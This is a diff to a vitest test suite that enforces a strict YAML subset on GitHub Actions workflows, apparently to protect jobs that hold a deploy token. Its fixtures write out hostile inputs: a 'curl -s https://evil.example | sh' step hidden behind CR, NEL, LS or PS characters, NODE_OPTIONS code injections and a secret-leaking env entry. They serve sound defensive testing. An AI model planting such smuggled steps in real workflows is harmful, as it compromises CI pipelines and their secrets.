@@ -3,7 +3,8 @@ import { fileURLToPath } from 'node:url';
 import { describe, expect, test } from 'vitest';
 
 const root = (path: string) => fileURLToPath(new URL(`../../${path}`, import.meta.url));
-const read = (path: string) => readFileSync(root(path), 'utf8').replaceAll('\r\n', '\n');
+// As the bytes are: a CR is refused below, not normalised away (.gitattributes checks workflows out as LF).
+const read = (path: string) => readFileSync(root(path), 'utf8');
 
 // GitHub runs every .yml and .yaml file in .github/workflows/, so every one is held to these rules.
 const WORKFLOWS = new Map(
@@ -15,16 +16,40 @@ const WORKFLOWS = new Map(
 // ---------------------------------------------------------------------------------------------
 // The canonical subset. There is no YAML parser among the dependencies, so every workflow must be
 // written in a subset of block YAML that the line-based reading below sees exactly as GitHub does.
-// Outside block scalars (the lines under a `key: |` or `key: >-` header), a line is blank, a
-// comment, `key:` or `key: value` with a bare key, or `- ` followed by one of those or by a value.
-// Each nested block sits exactly two spaces under its key, and no mapping repeats a key. A value
-// may not be a tag (!), anchor (&), alias (*), flow collection ({ or [) or complex key (?); a quoted
-// value closes on its own line; and a double-quoted value holds no backslash, whose escapes could
-// spell anything, `secrets` included.
+// A workflow holds only printable ASCII and LF, everywhere, comments and block scalars included:
+// YAML also breaks lines at CR, NEL, LS and PS, and a split on LF would never see a line one of
+// them starts. Indentation is spaces. Outside block scalars (the lines under a `key: |` or
+// `key: >-` header), a line is blank, a comment, `key:` or `key: value` with a bare key, or `- `
+// followed by one of those or by a value. Each nested block sits exactly two spaces under its key,
+// and no mapping repeats a key. A value may not be a tag (!), anchor (&), alias (*), flow
+// collection ({ or [) or complex key (?); a quoted value closes on its own line; and a
+// double-quoted value holds no backslash, whose escapes could spell anything, `secrets` included.
+// The keys that hold a mapping (env, with, ...) hold it on the lines below, never as one value
+// (an expression, or `inherit`) whose entries no line-based check could see.
 // ---------------------------------------------------------------------------------------------
 
 const KEY = /^([A-Za-z_][\w-]*):(?: (.*))?$/;
 const BLOCK_SCALAR = /^[|>][-+]?$/;
+const OUTSIDE_ASCII = /[^\x20-\x7E]/;
+const CHARACTER_NAMES: Record<string, string> = {
+  '\t': 'tab',
+  '\r': 'CR',
+  '\u0085': 'NEL',
+  '\u00A0': 'NBSP',
+  '\u2028': 'LS',
+  '\u2029': 'PS',
+  '\uFEFF': 'BOM',
+};
+const MAPPING_ONLY = new Set(['env', 'with', 'secrets', 'outputs', 'services', 'container', 'strategy', 'defaults', 'inputs', 'permissions']);
+/** The leading ASCII spaces: a tab, an NBSP or any other whitespace is not indentation. */
+const indentOf = (line: string) => /^ */.exec(line)![0].length;
+/** `U+000D (CR)`: a character by its code point, and by name if it's one of the usual suspects. */
+function codePoint(c: string): string {
+  const name = CHARACTER_NAMES[c];
+  return `U+${c.codePointAt(0)!.toString(16).toUpperCase().padStart(4, '0')}${name ? ` (${name})` : ''}`;
+}
+/** A line as printable ASCII, with every other character written as `<U+000D (CR)>`. */
+const visible = (line: string) => line.replace(/[^\x20-\x7E]/gu, (c) => `<${codePoint(c)}>`);
 
 /** What is wrong with a value after `key: ` or `- `, if anything. */
 function valueError(value: string): string | undefined {
@@ -47,14 +72,16 @@ function readCanonical(file: string, text: string): { errors: string[]; comments
   let scalarParent = -1; // the column of the key, or dash, whose block scalar this is
   text.split('\n').forEach((line, i) => {
     const fail = (why: string) => {
-      errors.push(`${file}:${i + 1}: ${why}: ${line.trim()}`);
+      errors.push(`${file}:${i + 1}: ${why}: ${visible(line).trim()}`);
     };
-    if (line.trim() === '') return;
-    const indent = line.length - line.trimStart().length;
+    // First, before blank lines, comments or block scalars are set aside: this holds everywhere.
+    const odd = OUTSIDE_ASCII.exec(line);
+    if (odd) return fail(`column ${odd.index + 1} is ${codePoint(odd[0])}, but a workflow holds only printable ASCII and LF`);
+    if (/^ *$/.test(line)) return;
+    const indent = indentOf(line);
     if (scalarParent >= 0 && indent > scalarParent) return;
     scalarParent = -1;
-    if (line.includes('\t')) return fail('a tab');
-    if (line.trimStart().startsWith('#')) return void comments.add(i);
+    if (line.slice(indent).startsWith('#')) return void comments.add(i);
     const item = line.slice(indent).startsWith('- ');
     if (parent !== undefined && indent > parent) {
       if (indent !== parent + 2) fail('a nested block not indented two spaces under its key');
@@ -94,6 +121,7 @@ function readCanonical(file: string, text: string): { errors: string[]; comments
     const why = valueError(value);
     if (why) return fail(why);
     if (BLOCK_SCALAR.test(value)) scalarParent = column;
+    if (MAPPING_ONLY.has(key)) fail(`"${key}" must be a mapping on the lines below, not a value on its own line`);
   });
   return { errors, comments };
 }
@@ -116,7 +144,11 @@ const JOB_KEY = /^ {2}[\w-]+:$/;
 function jobBlocks(file: string): Map<string, string> {
   const lines = jobLines(file);
   const starts = lines.flatMap((line, i) => (JOB_KEY.test(line) ? [i] : []));
-  if (starts.length === 0) throw new Error(`found no jobs in ${file}: has its layout changed?`);
+  if (starts.length === 0) {
+    // A file outside the subset (CRLF line endings, say) can hide every job: say why first.
+    const why = CANONICAL.get(file)!.errors.slice(0, 3);
+    throw new Error(`found no jobs in ${file}: has its layout changed?${why.length > 0 ? `\n${why.join('\n')}` : ''}`);
+  }
   return new Map(starts.map((start, i) => [lines[start]!.trim().slice(0, -1), lines.slice(start, starts[i + 1]).join('\n')]));
 }
 
@@ -143,7 +175,7 @@ function mapping(text: string, key: string, indent: number): Map<string, string>
   const out = new Map<string, string>();
   if (at === -1) return out;
   for (const line of lines.slice(at + 1)) {
-    if (line.length - line.trimStart().length <= indent) break;
+    if (indentOf(line) <= indent) break;
     const entry = new RegExp(`^ {${indent + 2}}([\\w-]+):(?: (.*))?$`).exec(line);
     if (entry) out.set(entry[1]!, entry[2] ?? '');
   }
@@ -220,6 +252,12 @@ const COPY_SITE = [
   'cp trusted/wrangler.jsonc "$RUNNER_TEMP/site/wrangler.jsonc"',
 ].join('\n');
 const COPY_CONFIG = ['mkdir -p "$RUNNER_TEMP/site"', 'cp trusted/wrangler.jsonc "$RUNNER_TEMP/site/wrangler.jsonc"'].join('\n');
+// An empty artifact-ids makes download-artifact take every artifact in the run, so the ID must be
+// one number: non-empty, with nothing left once its digits are removed.
+const ID_CHECK =
+  'test -n "$ARTIFACT_ID" && test -z "${ARTIFACT_ID//[0123456789]/}" || { echo "::error::the artifact ID is empty or not a number, and an empty one would download every artifact in the run"; exit 1; }';
+// download-artifact v8 is the first to fail on a digest mismatch by default (digest-mismatch: error).
+const DOWNLOAD_MAJOR = 8;
 const NOTICE = /^echo "::notice title=\w+ skipped::[^"$`\\]*"$/;
 // What each action may be given in a job that holds the token: a preCommands or a mirror would run
 // or fetch something the trusted ref did not choose, and a download by name could take a
@@ -231,7 +269,7 @@ const INPUTS: Record<string, string[]> = {
   'actions/github-script': ['script'],
   'cloudflare/wrangler-action': ['apiToken', 'accountId', 'wranglerVersion', 'workingDirectory', 'command'],
 };
-const STEP_ENV = ['WRANGLER_VERSION', 'PREVIEW_URL', 'npm_config_ignore_scripts', 'npm_config_min_release_age'];
+const STEP_ENV = ['WRANGLER_VERSION', 'ARTIFACT_ID', 'PREVIEW_URL', 'npm_config_ignore_scripts', 'npm_config_min_release_age'];
 const ARTIFACT_ID = '${{ steps.upload.outputs.artifact-id }}';
 
 // The jobs that hold the token: the environment each runs through, the ref it trusts, the job whose
@@ -343,13 +381,13 @@ describe.each(Object.entries(TOKEN_JOBS))('the %s job, which holds the token', (
 
   test('installs, builds and tests nothing, and runs only the shell it must', () => {
     for (const command of ['npm ci', 'npm install', 'npm i ', 'npm run', 'npm test', 'npx ']) expect(block, command).not.toContain(command);
-    const allowed = [TRUSTED_CONFIG, VERSION_CHECK, FLOOR_CHECK, expected.builder ? COPY_SITE : COPY_CONFIG];
+    const allowed = [TRUSTED_CONFIG, VERSION_CHECK, FLOOR_CHECK, ...(expected.builder ? [ID_CHECK, COPY_SITE] : [COPY_CONFIG])];
     for (const script of runs) expect(allowed.includes(script) || NOTICE.test(script), script).toBe(true);
     for (const script of allowed) expect(runs, script).toContain(script);
   });
 
-  test('has no container, services, shell, working-directory, defaults, outputs or continue-on-error', () => {
-    expect(block).not.toMatch(/^\s*(?:- )?(container|services|shell|working-directory|defaults|outputs|continue-on-error):/m);
+  test('has no container, services, strategy, shell, working-directory, defaults, outputs or continue-on-error', () => {
+    expect(block).not.toMatch(/^\s*(?:- )?(container|services|strategy|shell|working-directory|defaults|outputs|continue-on-error):/m);
   });
 
   test('uses only pinned actions/* and cloudflare/wrangler-action, with only the inputs they need', () => {
@@ -433,6 +471,16 @@ describe.each(Object.entries(TOKEN_JOBS))('the %s job, which holds the token', (
     }
   });
 
+  test('stops unless the artifact ID is one number, before it downloads with a download-artifact that fails on a digest mismatch', () => {
+    const check = at((step) => scalar(step, 'run', 8) === ID_CHECK);
+    for (const download of find('actions/download-artifact')) {
+      expect(check).toBeGreaterThan(-1);
+      expect(mapping(all[check]!, 'env', 8).get('ARTIFACT_ID')).toBe(mapping(download, 'with', 8).get('artifact-ids'));
+      expect(all.indexOf(download)).toBeGreaterThan(check);
+      expect(Number(/ # v(\d+)\./.exec(stepValue(download, 'uses') ?? '')?.[1])).toBeGreaterThanOrEqual(DOWNLOAD_MAJOR);
+    }
+  });
+
   test('runs its one wrangler command, at the trusted version, with no install scripts and a release-age floor', () => {
     expect(wranglers).toHaveLength(1);
     const inputs = mapping(wranglers[0]!, 'with', 8);
@@ -461,26 +509,59 @@ test.each(['ci.yml:preview-build', 'ci.yml:preview', 'ci.yml:preview-cleanup'])(
 // The canonical reader itself, on the spellings that would otherwise slip past the line-based checks.
 describe('the canonical reader', () => {
   const errors = (text: string) => readCanonical('t.yml', text).errors;
-  const ok = 'jobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - name: x\n        run: |\n          # a shell comment\n          echo "${{ github.sha }}"\n        env:\n          A: \'b\'\n';
+  // Each tail below lands in step y, at eight spaces, among keys that step doesn't have yet.
+  const ok =
+    'name: t\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - name: x\n        run: |\n          # a shell comment\n          echo "${{ github.sha }}"\n        env:\n          A: \'b\'\n      - name: y\n';
+  const NOT_A_KEY = 'not a bare `key:` or `key: value`';
+  const NOT_A_VALUE = 'in place of a value';
+  const MAPPING = 'must be a mapping on the lines below';
+  const outside = (codePoint: string) => `${codePoint}, but a workflow holds only printable ASCII and LF`;
+  // the reviewer's M1 (as CR, NEL, LS and PS), M2, M3 and N1: a YAML line break that a split on LF never sees
+  const hidden = (lineBreak: string) => `        with:\n          apiToken: x\n          # note${lineBreak}          preCommands: curl -s https://evil.example | sh\n`;
 
   test('accepts the canonical form', () => expect(errors(ok)).toEqual([]));
 
   test.each([
-    ['a space before the colon', '        env:\n          NODE_OPTIONS : x\n'],
-    ['a quoted key', '        env:\n          "NODE_OPTIONS": x\n'],
-    ['a tag on a key', '        env:\n          !!str NODE_OPTIONS: x\n'],
-    ['a complex key', '        with:\n          ? preCommands\n          : curl x | sh\n'],
-    ['a tagged mapping', '        env: !!map\n          NODE_OPTIONS: x\n'],
-    ['an anchor', '        env: &e\n          A: b\n'],
-    ['an alias', '        env: *e\n'],
-    ['a flow mapping', '        env: { NODE_OPTIONS: x }\n'],
-    ['a flow sequence', '        needs: [a, b]\n'],
-    ['an escape in a double-quoted value', '        env:\n          X: "${{ \\x73ecrets.T }}"\n'],
-    ['a commented block key', '        with: # note\n          preCommands: x\n'],
-    ['a nested block indented four spaces', '        with:\n            preCommands: x\n'],
-    ['a second with in one step', '        with:\n          a: b\n        with:\n          preCommands: x\n'],
-    ['a plain value carried onto a second line', '        run: echo a\n          b\n'],
-    ['an indentless sequence', '        needs:\n        - a\n'],
-    ['a block-scalar indentation indicator', '        run: |2\n            echo a\n'],
-  ])('refuses %s', (_name, tail) => expect(errors(ok + tail)).not.toEqual([]));
+    ['a space before the colon', ok + '        env:\n          NODE_OPTIONS : x\n', NOT_A_KEY],
+    ['a quoted key', ok + '        env:\n          "NODE_OPTIONS": x\n', NOT_A_KEY],
+    ['a tag on a key', ok + '        env:\n          !!str NODE_OPTIONS: x\n', NOT_A_KEY],
+    ['a complex key', ok + '        with:\n          ? preCommands\n          : curl x | sh\n', NOT_A_KEY],
+    ['a tagged mapping', ok + '        env: !!map\n          NODE_OPTIONS: x\n', NOT_A_VALUE],
+    ['an anchor', ok + '        env: &e\n          A: b\n', NOT_A_VALUE],
+    ['an alias', ok + '        env: *e\n', NOT_A_VALUE],
+    ['a flow mapping', ok + '        env: { NODE_OPTIONS: x }\n', NOT_A_VALUE],
+    ['an empty flow mapping', ok + '        env: {}\n', NOT_A_VALUE],
+    ['a flow sequence', ok + '        needs: [a, b]\n', NOT_A_VALUE],
+    ['an escape in a double-quoted value', ok + '        env:\n          X: "${{ \\x73ecrets.T }}"\n', 'a double-quoted value with a backslash'],
+    ['a commented block key', ok + '        with: # note\n          preCommands: x\n', NOT_A_VALUE],
+    ['a nested block indented four spaces', ok + '        with:\n            preCommands: x\n', 'a nested block not indented two spaces'],
+    ['a second with in one step', ok + '        with:\n          a: b\n        with:\n          preCommands: x\n', 'a second "with" in one mapping'],
+    ['a plain value carried onto a second line', ok + '        run: echo a\n          b\n', 'an indentation that matches no open block'],
+    ['an indentless sequence', ok + '        needs:\n        - a\n', 'a sequence item among keys'],
+    ['a block-scalar indentation indicator', ok + '        run: |2\n            echo a\n', NOT_A_VALUE],
+    // Ruling 67: printable ASCII and LF only, comments and block scalars included.
+    ['M1: a CR in a comment, hiding preCommands', ok + hidden('\r'), outside('U+000D (CR)')],
+    ['M1: a NEL in a comment, hiding preCommands', ok + hidden('\u0085'), outside('U+0085 (NEL)')],
+    ['M1: an LS in a comment, hiding preCommands', ok + hidden('\u2028'), outside('U+2028 (LS)')],
+    ['M1: a PS in a comment, hiding preCommands', ok + hidden('\u2029'), outside('U+2029 (PS)')],
+    ['M2: a CR in a top-level comment, hiding an env', 'name: t\n# note\renv:\r  NODE_OPTIONS: --import=data:text/javascript,0\n' + ok.slice('name: t\n'.length), outside('U+000D (CR)')],
+    ['M3: a CR in a job comment, hiding a secret', ok.replace('  a:\n', '  a:\n    # note\r    env:\r      LEAK: ${{ secrets.T }}\n'), outside('U+000D (CR)')],
+    ['N1: a NEL in a step name, hiding an env', ok.replace('      - name: y\n', '      - name: y\u0085        env:\u0085          NODE_OPTIONS: --import=data:text/javascript,0\n'), outside('U+0085 (NEL)')],
+    ['a byte-order mark', '\uFEFF' + ok, outside('U+FEFF (BOM)')],
+    ['NBSP indentation', ok + '        env:\n' + '\u00A0'.repeat(10) + 'A: b\n', outside('U+00A0 (NBSP)')],
+    ['a tab for indentation', ok + '        env:\n\t  A: b\n', outside('U+0009 (tab)')],
+    ['a tab in a block scalar', ok + '        run: |\n          echo a\tb\n', outside('U+0009 (tab)')],
+    ['a CRLF file', ok.replaceAll('\n', '\r\n'), outside('U+000D (CR)')],
+    // Ruling 68: a key that holds a mapping holds nothing else on its own line.
+    ['M5: an env written as one expression', ok + `        env: \${{ fromJSON('{"NODE_OPTIONS":"--import=data:text/javascript,0"}') }}\n`, MAPPING],
+    ['a with written as one expression', ok + "        with: ${{ fromJSON('{\"preCommands\":\"curl x | sh\"}') }}\n", MAPPING],
+    ['secrets: inherit', ok + '        secrets: inherit\n', MAPPING],
+    ['permissions: write-all', 'permissions: write-all\n' + ok, MAPPING],
+    ['a block scalar for env', ok + '        env: |\n          A=b\n', MAPPING],
+  ])('refuses %s', (_name, text, why) => expect(errors(text).join('\n')).toContain(why));
+
+  test.each(['env', 'with', 'secrets', 'outputs', 'services', 'container', 'strategy', 'defaults', 'inputs', 'permissions'])(
+    'refuses %s with a value on its own line',
+    (key) => expect(errors(`${ok}        ${key}: \${{ fromJSON('{}') }}\n`).join('\n')).toContain(`"${key}" ${MAPPING}`),
+  );
 });
